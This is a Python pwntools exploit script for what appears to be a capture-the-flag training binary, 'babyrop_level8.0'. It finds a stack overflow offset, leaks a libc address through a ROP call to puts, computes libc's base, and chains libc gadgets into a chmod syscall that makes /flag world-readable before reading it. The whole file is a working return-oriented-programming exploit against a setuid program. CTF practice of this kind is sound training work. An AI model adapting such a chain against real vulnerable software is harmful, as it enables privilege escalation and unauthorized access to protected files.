#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'

elf = ELF('/challenge/babyrop_level8.0')

io = elf.process(setuid=False)

io.sendline(cyclic(512, n=8))
io.wait()
buff_length = cyclic_find(io.corefile.fault_addr, n=8)

io = elf.process()

# Obtain the libc ELF
libc_elf = ELF(io.libc.path)
rop = ROP(elf)

# Build a ROP chain that:
#   1. Prints the address of the puts function inside GOT
#   2. Call again the 'challenge' function
rop.puts(elf.got.puts)
rop.call('challenge')

# Send the payload with the ROP chain
PAYLOAD = b'A'*(buff_length) + rop.chain()
io.sendline(PAYLOAD)

# Get the address from the output
# NOTE: the address is received as bytes, then left justified by 8 bytes
#       and finally unpacked as a 64 bits value
io.recvuntil(b'Leaving!\n')
puts_got_address = u64(io.recvline()[:-1].ljust(8, b'\x00'))

# Compute and assign the base address of the libc by: puts_got_address - puts_plt_address
libc_base_address = puts_got_address - libc_elf.symbols.puts
print(f"puts@got address: {hex(puts_got_address)}")
print(f"puts@plt address: {hex(libc_elf.symbols.puts)}")
print(f"libc base address: {hex(libc_base_address)}")
libc_elf.address = libc_base_address

# Set the addresses of the needed gadgets by:
#   - Getting the offsets from ROPgadget --binary <path_to_libc> | grep "<gadget_op>"
#   - Adding those offsets to the libc base address
# NOTE: <path_to_libc> can be optained by printing "elf.libc.path"
RDI_gadget_addr = libc_elf.address + 0x23b6a
RSI_gadget_addr = libc_elf.address + 0x2601f
RAX_gadget_addr = libc_elf.address + 0x36174
SYSCALL_gadget_addr = libc_elf.address + 0x2284d

# Build the payload with the ROP chain
# NOTE: b"Leaving!\x00" is the name of the symbolic link created by the command: ln -s /flag "Leaving!"
PAYLOAD = b'A'*(buff_length) +\
            p64(RDI_gadget_addr) + p64(next(elf.search(b'Leaving!\x00'))) +\
            p64(RSI_gadget_addr) + p64(0o777) +\
            p64(RAX_gadget_addr) + p64(0x5A) +\
            p64(SYSCALL_gadget_addr)

# Send the payload to the application
io.sendline(PAYLOAD)
io.interactive()

# Once we have executed the chmod system call we try 
# to open and read the "/flag" file
with open("/flag") as f:
    print(next(f))